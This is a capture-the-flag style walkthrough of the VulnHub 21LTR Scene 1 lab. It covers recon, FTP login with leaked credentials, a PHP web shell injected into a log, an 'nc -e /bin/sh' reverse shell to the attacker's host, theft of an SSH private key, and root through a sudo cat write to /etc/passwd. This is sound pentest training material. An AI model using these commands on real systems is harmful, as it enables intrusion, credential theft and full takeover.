# 21LTR-Scene-1 in 2020
This is a hlog (hacking log) Walkthrough, vm is from https://www.vulnhub.com/entry/21ltr-scene-1,3/

Scene 1
Your pentesting company has been hired to perform a test on a client company's internal network. Your team has scanned the network and you have been assigned one of the discovered systems. Perform a test on this system starting from the beginning of your chosen methodology and submit your report to the project manager at scenes AT 21LTR DOT com

Scope Statement
The client has defined a set of limitations for the pentest: - All tests will be restricted to the systems identified on the 192.168.2.0/24 network. - All commands run against the network and systems must be supplied in the form of script files packaged with the submission of the report - A final report indicating all identified vulnerabilities and exploits will be provided to the company's engineering department within 90 days of the start of this engagement.

Configuration
Scenario Pentest Lab Scene 1:

This LiveCD is configured with an IP address of 192.168.2.120 - no additional configuration is necessary.


1.Import iso into esxi server.  
Once downloaded, upload your file to Datastore, so you can apply the iso when you create the vm. 

2.Change Kali's ip address, so it both machines are ping each other. 

3.Let the hunt begins! Let do a nmap first 

`nmap -sV 192.168.2.120 `  OR just simplely  `nmap 192.168.2.120`

4.Looking at what services they are offering 
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-29 22:42 CST  
Nmap scan report for 192.168.2.120  
Host is up (0.00058s latency).  
Not shown: 997 closed ports  
PORT      STATE SERVICE     VERSION  
21/tcp    open  ftp         ProFTPD 1.3.1  
22/tcp    open  ssh         OpenSSH 5.1 (protocol 1.99)  
80/tcp    open  http        Apache httpd 2.2.13 ((Unix) DAV/2 PHP/5.2.10)   
Service Info: OS: Unix  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 19.49 seconds  
```
5. Http services looks like a great start. 
``` firefox 192.168.2.120 ```  
Then press F12 to see the source code, you will see a log info..  
```  <!-- username:logs password:zg]E-b0]+8:(58G -->  ``` 

6. Let's have a deeper understanding of this website. 
``` dirb http://192.168.2.120 ``` 
Then you will see a entering directory: http://192.168.2.120/logs/ 

7. Great start! Let's go to this link, no so good. 
``` 
Forbidden 
You don't have permissions to access /logs/ on this server.
```
 Well, we don't have much luck there. 
 
8. Don't forget about we also have an ftp service running, why don't we try that? 

``` ftp 192.168.2.120 ``` 

then enter logs as the username, zg... as the password. 

9. Code 230, you are login! 

Like we always do, using ``` ls``` to look for any files.

Then we find out something interesting. Using ``` get backup_log.php ``` download the file into our local directory. 

10. Check out what is inside? 

``` cat backup_log.php ``` to see what's inside. 

```
<html>                                                                                                                        
        <head>  
                <title></title>  
        </head>                  
        <body>   
                <h2 style="text-align: center">  
                        Intranet Dev Server Backup Log</h2>  
                        <?php $log = time(); echo '<center><b>GMT time is: '.gmdate('r', $log).'</b></center>'; ?>            
                <p>                                                                                                           
                        &nbsp;</p>               
                <h4>                             
                        Backup Errors:</h4>  
                <p>                          
                        &nbsp;</p>           
        </body>                              
</html>  
  
Wed, 03 Jan 2012 09:51:42 +0000 from 192.168.2.240: Permission denied  
<br><br>  
Thu, 04 Jan 2012 13:11:29 +0000 from 192.168.2.240: No Such file or directory  
<br><br>  
Thu, 04 Jan 2012 13:31:36 +0000 from 192.168.2.240: No space left on device  
<br><br>  
Thu, 04 Jan 2012 13:41:36 +0000 from 192.168.2.240: No Space left on device  
<br><br>  
Mon, 16 Feb 2012 17:01:02 +0000 from 192.168.2.240: No Space left on device  
<br><br>  
Fri, 23 Apr 2012 10:51:07 +0000 from 192.168.2.240: No Space left on device  
<br><br>  
Fri, 12 May 2012 16:41:32 +0000 from 192.168.2.240: No Space Left on device  
<br><br>  
GET / HTTP/1.0  

```
11.Ip 192.168.2.240 looks interesting, and it looks like we are server trying to send us something every 10 mins. 

```
Thu, 04 Jan 2012 13:31:36 +0000 from 192.168.2.240: No space left on device  
<br><br>  
Thu, 04 Jan 2012 13:41:36 +0000 from 192.168.2.240: No Space left on device  
<br><br> 
```
Let's change our ip and see what is up. At this point, we need to change our Kail ip to 192.168.2.240

12. Fired up wireshark, and see what files that server trying to send me. 

Apply filters in wireshark 

``` ip.src == 192.168.2.120 ``` 

then you will find out something is happening at port 10001 

so an additional filter was added 
``` tcp.port == 10001 ```


13. With the port number confirmed, it is time for nc. 

When I try nc on port 10001 at first, I was getting connection refused. Then I search online a bit and someone recommanded to use a while loop, so here we go. 

```
while true; do nc -v 192.168.2.120 10001 && break; sleep 1; clear; done 
```
if it shows connection refused, wait for a little. 

Once you see the connection has been established, then enter 

``` <?php system($_GET['cmd']) ?> ``` 

This command is using PHP one-liner, and it allows us to run commands from here. 

14. Let's try run some commands here 

```
http://192.168.2.120/logs/backup_login.php?cmd=whoami 
```

At the really bottom of the web page , we see ``` apache ``` on the bottom, which is great! We can run commands now. 


15.Let's start an netcat as listener on our Kali terminal

```
nc -lvp 443 
```


16.Now we will try a bash one-liner to get a reverse shell

```
http://192.168.2.120/logs/backup_login.php?cmd=nc -e /bin/sh 192.168.2.12 443
```
The web broswer will not be responding, but that is ok, we are still getting the things we needed. 

17.Gain the /bin/sh access from this 443 nc session 

So far we have  an incomplete and improper shell, in order to invoke a proper shell, we will be using a python one-liner

```
python -c 'import pty; pty.spawn("/bin/sh")'
```
Hit enter when you done entering. 

18.sh-3.1$ ---Yeah, we are almost done. 

At this point, you can run bash commands on this nc session. By going through their folders, there is something interesting. 

```
cd /media/USB_1/Stuff/Keys/
cat authorized_keys     you will see an user name here hbeale@slax
cat id_rsa  ---- this is the private key... 
```

19.Using key to login, good....  Copy the key to local, then save key file and change permissions

``` chmod 600 id_rsa(yourfilename) ``` 

20.Login to the server, using keys.Since we changed the permissions of our private key, we now can use the key to login. 

```ssh -i id_rsa hbeale@192.168.2.120 ``` 

21.Viewing permissions. Let's try on a low permission command.  ``` sudo -l ``` 

We also discover something intersting. ```  (root) NOPASSWD: /usr/bin/cat ``` 

22.Gain root permissions.  Entering  ``` sudo /usr/bin/cat >> /etc/passwd  ```  and  ``` orange::0:0::/root:/bin/bash  ```

When you done, use Control+C  to end, then use ``` su orange ```   To gain the root permissions. 

(orange can be replaced to any username)

23. Checking the root permissions. 

As soon as you finished entering that command , you will see  ``` root@slax:/home/hbeale# ```

When you check ``` id ```  You will see   ``` uid=0(root) gid=0(root) groups=0(root) ```
 
24. Great job! All done! 
